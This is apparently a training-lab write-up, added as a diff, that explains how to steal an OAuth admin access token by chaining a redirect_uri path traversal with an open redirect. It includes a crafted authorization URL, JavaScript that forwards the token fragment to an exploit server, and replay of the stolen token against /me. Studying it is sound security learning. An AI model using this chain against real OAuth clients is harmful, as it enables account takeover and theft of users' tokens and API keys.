@@ -1,0 +1,352 @@
+// Lab: Stealing OAuth access tokens via an open redirect
+
+
+This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.
+
+To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.
+
+Note
+You cannot access the admin's API key by simply logging in to their account on the client application.
+
+
+
+The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.
+
+You can log in via your own social media account using the following credentials: wiener:peter.
+
+
+
+
+
+// Solution:
+
+## Step-by-Step Solution (Easy to Understand)
+
+## Objective
+
+Steal the victim's OAuth **access token**, use it to call the **`/me`** API endpoint, retrieve the victim's **API key**, and submit it to solve the lab.
+
+---
+
+# Step 1: Log in with OAuth
+
+1. Open the lab.
+2. Click **My Account**.
+3. Log in using the provided OAuth account:
+
+   * Username: `wiener`
+   * Password: `peter`
+4. After successful login, you will be redirected back to the blog.
+
+---
+
+
+
+# Step 2: Save the `/me` Request
+
+1. Open **Burp Suite**.
+2. Go to **Proxy → HTTP History**.
+3. Find the request:
+
+```
+GET /me
+```
+
+4. Right-click it.
+5. Select **Send to Repeater**.
+
+**Do not modify it yet.**
+You will use it later with the victim's access token.
+
+---
+
+
+
+# Step 3: Capture the OAuth Authorization Request
+
+1. Log out.
+2. Log in again using OAuth.
+3. In **HTTP History**, find:
+
+```
+GET /auth?client_id=...
+```
+
+4. Send this request to **Repeater**.
+
+---
+
+
+
+# Step 4: Test Directory Traversal
+
+Locate:
+
+```
+redirect_uri=https://LAB-ID.web-security-academy.net/oauth-callback
+```
+
+Replace it with:
+
+```
+redirect_uri=https://LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1
+```
+
+Click **Send**.
+
+Follow the redirects.
+
+If everything works correctly, you will end up on the first blog post and the browser URL will contain:
+
+```
+#access_token=xxxxxxxx
+```
+
+This confirms that **Directory Traversal** exists in the `redirect_uri` parameter.
+
+---
+
+
+
+# Step 5: Find the Open Redirect
+
+Open any blog post.
+
+Scroll to the bottom.
+
+Click **Next Post**.
+
+In Burp HTTP History, find:
+
+```
+GET /post/next?path=...
+```
+
+Send it to **Repeater**.
+
+Replace the `path` parameter with your Exploit Server URL.
+
+Example:
+
+```
+path=https://YOUR-EXPLOIT-ID.exploit-server.net/exploit
+```
+
+Click **Send**.
+
+If the response contains:
+
+```
+HTTP/2 302 Found
+
+Location: https://YOUR-EXPLOIT-ID.exploit-server.net/exploit
+```
+
+then the endpoint is vulnerable to **Open Redirect**.
+
+---
+
+
+
+# Step 6: Build the Malicious OAuth URL
+
+Create the following URL:
+
+```
+https://oauth-YOUR-OAUTH-ID.oauth-server.net/auth
+?client_id=YOUR_CLIENT_ID
+&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-ID.exploit-server.net/exploit
+&response_type=token
+&nonce=YOUR_NONCE
+&scope=openid%20profile%20email
+```
+
+Open this URL in your browser.
+
+You should finally reach your Exploit Server with:
+
+```
+#access_token=...
+```
+
+in the URL.
+
+---
+
+
+
+
+# Step 7: Create a Script to Leak the Access Token
+
+Go to the Exploit Server.
+
+In the Body section, enter:
+
+```
+<script>
+window.location='/?'+document.location.hash.substr(1)
+</script>
+```
+
+Click **Store**.
+
+Visit the malicious OAuth URL again.
+
+Open **Access Log**.
+
+You should see:
+
+```
+GET /?access_token=...
+```
+
+This confirms that the access token can be leaked.
+
+---
+
+
+
+# Step 8: Create the Final Exploit
+
+Replace the previous script with:
+
+```
+<script>
+if (!document.location.hash) {
+
+window.location='https://oauth-YOUR-OAUTH-ID.oauth-server.net/auth?client_id=YOUR_CLIENT_ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-ID.exploit-server.net/exploit&response_type=token&nonce=YOUR_NONCE&scope=openid%20profile%20email';
+
+}
+else{
+
+window.location='/?'+document.location.hash.substr(1);
+
+}
+</script>
+```
+
+Click **Store**.
+
+Click **View Exploit**.
+
+Open **Access Log** and verify that a request containing:
+
+```
+GET /?access_token=...
+```
+
+appears.
+
+---
+
+
+
+# Step 9: Deliver the Exploit
+
+Click:
+
+```
+Deliver exploit to victim
+```
+
+Wait a few seconds.
+
+Open the Exploit Server **Access Log**.
+
+Copy the victim's:
+
+```
+access_token=XXXXXXXX
+```
+
+---
+
+
+
+# Step 10: Use the Victim's Access Token
+
+Open the previously saved **GET /me** request in Repeater.
+
+Locate:
+
+```
+Authorization: Bearer YOUR_TOKEN
+```
+
+Replace it with:
+
+```
+Authorization: Bearer VICTIM_ACCESS_TOKEN
+```
+
+If the header is missing, add it manually.
+
+Click **Send**.
+
+The response will contain the victim's profile information, including their **API key**.
+
+---
+
+
+
+# Step 11: Submit the API Key
+
+Copy the victim's API key.
+
+Click **Submit Solution** at the top of the lab.
+
+Paste the API key.
+
+The lab is solved.
+
+---
+
+# Attack Flow (Revision)
+
+```
+OAuth Login
+      │
+      ▼
+GET /auth
+      │
+      ▼
+Directory Traversal in redirect_uri
+      │
+      ▼
+Open Redirect (/post/next)
+      │
+      ▼
+Exploit Server
+      │
+      ▼
+JavaScript steals access_token
+      │
+      ▼
+Deliver exploit to victim
+      │
+      ▼
+Victim access_token leaked
+      │
+      ▼
+Use stolen token in GET /me
+      │
+      ▼
+Receive victim API key
+      │
+      ▼
+Submit API key
+      │
+      ▼
+Lab Solved
+```
+
+## Key Points to Remember
+
+* Save the **GET `/me`** request before doing anything else.
+* Confirm **Directory Traversal** using `/oauth-callback/../post?postId=1`.
+* Confirm **Open Redirect** using `/post/next?path=`.
+* Combine both vulnerabilities to leak the OAuth access token.
+* Use the victim's stolen token in the **`Authorization: Bearer`** header of the **GET `/me`** request.
+* Extract the victim's API key and submit it to solve the lab.
+
+
